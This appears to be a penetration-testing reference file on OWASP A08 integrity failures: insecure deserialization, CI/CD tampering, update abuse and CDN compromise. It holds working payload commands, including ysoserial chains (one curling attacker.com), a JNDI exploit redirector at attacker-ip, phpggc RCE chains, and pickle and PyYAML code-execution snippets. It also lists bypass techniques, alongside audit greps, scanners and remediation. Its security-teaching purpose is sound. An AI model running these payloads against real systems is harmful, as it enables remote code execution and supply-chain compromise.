---
name: integrity_failures
description: Software and data integrity failure testing covering CI/CD tampering, unsigned updates, insecure deserialization, CDN compromise, and auto-update abuse
---

# Software and Data Integrity Failures

OWASP A08 — Failures related to code and infrastructure that does not protect against integrity violations. This includes insecure deserialization, CI/CD pipeline tampering, unsigned software updates, and supply chain compromises that affect the integrity of the software development and deployment lifecycle.

## Attack Surface

**Deserialization**
- Application deserializing untrusted data (JSON, XML, YAML, Pickle, PHP serialize, Java serialization)
- RMI, JMX, and JNDI endpoints accepting serialized objects
- Message queues (Kafka, RabbitMQ, ActiveMQ) processing serialized messages
- Session tokens stored as serialized objects (Java, PHP, .NET)

**CI/CD Pipelines**
- GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure DevOps
- Build artifacts and release pipelines
- Dependency installation and build scripts
- Deployment mechanisms and rollback processes

**Update Mechanisms**
- Auto-update services (Electron, desktop apps, mobile apps)
- Package manager update channels
- Container image pulls and Helm chart deployments
- Plugin/extension marketplace installations

**Distribution Channels**
- CDN-hosted libraries and assets
- Container registries (Docker Hub, ECR, GCR, ACR)
- Package registries (npm, PyPI, Maven Central)
- Binary distribution sites

## Key Vulnerabilities

### Insecure Deserialization

**Java Deserialization**

```bash
# Identify Java serialization endpoints
# Look for Content-Type: application/x-java-serialized-object
# Check for RMI (1099), JMX (JNDI), JMS endpoints

# Use ysoserial for gadget chains
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned'
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/callback'
java -jar ysoserial.jar Groovy1 'id'
java -jar ysoserial.jar Spring1 'id'

# Available gadget chains (depends on target libraries):
# CommonsCollections1-7, Groovy1, Spring1-2, Hibernate1-2
# Jdk7u21, JRMPClient, BeanShell1, C3P0, Wicket1

# Generate payload for specific target
java -jar ysoserial.jar <gadget> '<command>' | base64 -w0

# Send serialized object via HTTP
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin

# RMI exploitation
python3 rmitool.py <host> 1099 "touch /tmp/pwned"

# JNDI injection
# Start LDAP/RMI redirector
java -jar JNDIExploit.jar -i attacker-ip
# Then trigger: ldap://attacker-ip:1389/Basic/Command/calc
```

**PHP Deserialization**

```bash
# Identify PHP serialization (look for O:, a:, s:, i: patterns)
# PHP serialize format: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Object injection via phar:// wrapper
# Upload phar file with serialized metadata
# Trigger via: phar://uploads/malicious.jpg/test.txt

# PHPGGC — PHP Generic Gadget Chains
phpggc Laravel/RCE1 system 'id'
phpggc Symfony/RCE1 system 'id'
phpggc WordPress/GutenbergRCE1 system 'id'
phpggc Monolog/RCE1 system 'id'

# Generate base64 payload
phpggc -b Laravel/RCE1 system 'id'

# POP chain exploitation
# Look for __wakeup, __destruct, __toString, __call methods
grep -rn "__wakeup\|__destruct\|__toString\|__call" --include="*.php" .
```

**Python Deserialization**

```bash
# Pickle deserialization
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# PyYAML deserialization (yaml.load vs yaml.safe_load)
python3 -c "
import yaml
# Dangerous: yaml.load allows arbitrary Python objects
payload = '!!python/object/apply:os.system [\"id\"]'
print(yaml.load(payload))
"

# Check for unsafe deserialization
grep -rn "pickle.loads\|yaml.load(" --include="*.py" .
grep -rn "marshal.loads\|shelve.open" --include="*.py" .
# yaml.load is only safe when Loader=yaml.SafeLoader is specified
```

**JSON Deserialization**
```bash
# Jackson (Java) polymorphic type handling
# @JsonTypeInfo, @JsonSubTypes — can instantiate arbitrary classes
# Look for: ObjectMapper.enableDefaultTyping()
# Or: @JsonTypeInfo(use = Id.CLASS)

# .NET TypeNameHandling
# Look for: TypeNameHandling.All, TypeNameHandling.Auto
# Newtonsoft.Json: TypeNameHandling allows arbitrary type instantiation

# Prototype pollution → deserialization in Node.js
# JSON.parse with reviver function can be abused
```

### CI/CD Pipeline Tampering

**GitHub Actions**

```bash
# Review workflow files
cat .github/workflows/*.yml

# Dangerous patterns to audit:
# 1. pull_request_target with checkout of PR head
#    - Allows arbitrary code execution from forks
# 2. Unpinned third-party actions
#    - uses: actions/checkout@main (mutable)
#    - Safe: uses: actions/checkout@abc123 (SHA pinned)
# 3. Secrets exposed to fork PRs
#    - Workflow runs with secrets on pull_request_target
# 4. Script injection via event context
#    - run: echo ${{ github.event.pull_request.title }}
#    - Attacker controls PR title → command injection
# 5. Excessive permissions
#    - permissions: write-all

# Check for script injection
grep -rn 'github.event\|github.head_ref\|github.pull_request' .github/workflows/
grep -rn '\$\{\{' .github/workflows/ | grep -v "secrets\."

# Verify action pinning
grep -rn "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"

# Check for artifact poisoning
# Actions that download artifacts from previous jobs
# Could be poisoned by a malicious PR
```

**Jenkins**

```bash
# Review Jenkinsfile
cat Jenkinsfile

# Dangerous patterns:
# - Using environment variables in sh steps without sanitization
# - Declarative pipeline with script blocks accepting untrusted input
# - Shared libraries from untrusted sources
# - Credentials exposed in build logs

# Check for credential exposure
grep -rn "credentials\|withCredentials\|secret" Jenkinsfile

# Shared library verification
cat vars/*.groovy  # Check shared library scripts
```

**GitLab CI**

```bash
# Review .gitlab-ci.yml
cat .gitlab-ci.yml

# Dangerous patterns:
# - include: remote (loading external CI configs)
# - rules: with MR variables from untrusted sources
# - before_script/after_script with injection points
# - artifacts from untrusted jobs used in later stages

# Check for remote includes
grep -rn "include:" .gitlab-ci.yml
```

### Auto-Update Mechanism Abuse

```bash
# Electron apps — check update server verification
# Look for: autoUpdater.setFeedURL()
# Check if update manifest is signed
# Verify: signature checking, certificate pinning, HTTPS enforcement

# Windows auto-update
# Check for:
# - Unsigned binaries downloaded over HTTP
# - DLL search order hijacking in update directory
# - Missing signature verification on update packages

# Mobile apps
# Check certificate pinning on update endpoints
# Verify app bundle signatures before installation

# Container image integrity
# Check for image signing (Docker Content Trust, Cosign)
docker trust inspect --pretty image:tag
cosign verify image:tag

# Verify Helm chart provenance
helm verify chart-name.tgz
```

### CDN Compromise

```bash
# Check CDN-hosted dependencies for integrity
# SRI (Subresource Integrity) verification
grep -r "integrity=" index.html

# Missing SRI = vulnerable to CDN compromise
# Generate SRI hash:
openssl dgst -sha384 -binary lib.js | openssl base64 -A

# Check if CDN allows arbitrary code serving
# Some CDNs serve user-uploaded content (unpkg, jsDelivr)
# Verify pinned versions, not latest/branch refs
```

## Tools

**ysoserial** — Java deserialization payload generator
```bash
# Generate payloads
java -jar ysoserial.jar <gadget> '<command>'

# Test for deserialization vulnerabilities
# Send generated payload to endpoint, monitor for callback
```

**PHPGGC** — PHP gadget chain generator
```bash
# List available chains
phpggc -l

# Generate payload for specific framework
phpggc Laravel/RCE1 system 'id'
```

**Semgrep** — Static analysis for deserialization patterns
```bash
# Find unsafe deserialization
semgrep --config "p/unsafe-deserialization" .
semgrep --config "p/owasp-top-ten" .

# Custom rules
semgrep --config rules/deserialization.yaml .
```

**Trivy** — CI/CD configuration scanning
```bash
# Scan CI/CD configs
trivy config .github/workflows/
trivy config .gitlab-ci.yml

# Scan for misconfigurations
trivy config --severity HIGH,CRITICAL .
```

## Bypass Techniques

**Deserialization**
- Unicode normalization bypass on class name filtering
- Base64 encoding variations (standard, URL-safe, no padding)
- Nested serialization (serialized object containing serialized string)
- Gadget chain switching when specific libraries are available
- Using alternative serialization formats (JSON → XML → YAML)

**CI/CD**
- Timing attacks: push malicious commit between pipeline approval and execution
- Environment variable pollution through PR metadata
- Cache poisoning across pipeline runs
- Artifact substitution between build and deploy stages

**Update Mechanisms**
- DNS hijacking to redirect update checks to attacker server
- MITM on HTTP update channels
- Exploiting race conditions in download-and-verify logic
- Downgrade attacks to force older, vulnerable version installation

## Testing Methodology

1. **Identify deserialization sinks** — Find all endpoints accepting serialized data
2. **Determine serialization format** — Java, PHP, Python, JSON, XML, YAML
3. **Map available gadgets** — Identify libraries present on target for gadget chains
4. **Generate payloads** — Use ysoserial/PHPGGC/custom scripts
5. **Test with safe payloads** — Use DNS callbacks or timing-based detection first
6. **CI/CD configuration review** — Audit all pipeline files for injection points
7. **Update mechanism testing** — Verify signature checking on all update channels
8. **Artifact integrity** — Check for signing, SRI, and provenance verification
9. **Dependency integrity** — Verify lock files, checksums, and package signatures

## Validation

1. Demonstrate deserialization leading to code execution or information disclosure
2. Show CI/CD pipeline injection point with proof-of-concept
3. Prove unsigned or unverified update can be tampered with
4. Identify missing integrity checks on distributed artifacts
5. Show CDN dependency without SRI that could be compromised

## Remediation

- Never deserialize untrusted data; use safe alternatives (JSON without type info)
- Implement allowlists for deserialization classes
- Pin CI/CD actions to commit SHAs, not branch names
- Enforce signature verification on all update mechanisms
- Implement SRI on all CDN-hosted dependencies
- Use content signing for build artifacts (Sigstore, GPG)
- Apply principle of least privilege to CI/CD pipeline permissions
- Implement artifact provenance verification (SLSA)
- Regularly audit CI/CD configurations for injection vulnerabilities

## Pro Tips

1. Test deserialization with DNS callbacks first — less noisy than command execution
2. Gadget chains depend on exact library versions — fingerprint dependencies first
3. CI/CD injection often requires a legitimate PR/MR — use a test account
4. Auto-update race conditions can be found with concurrent download tests
5. Many applications have hidden deserialization endpoints (session handling, caching)
6. Check both the pipeline configuration AND the runner environment for weaknesses
7. Container image tags can be mutated — use digest-based references

## Summary

Integrity failures occur when applications trust data or code without verifying its authenticity. Insecure deserialization is a direct code execution vector; CI/CD pipeline weaknesses allow build process compromise; missing update verification enables arbitrary code distribution. Every touchpoint where external data becomes internal action must verify integrity.
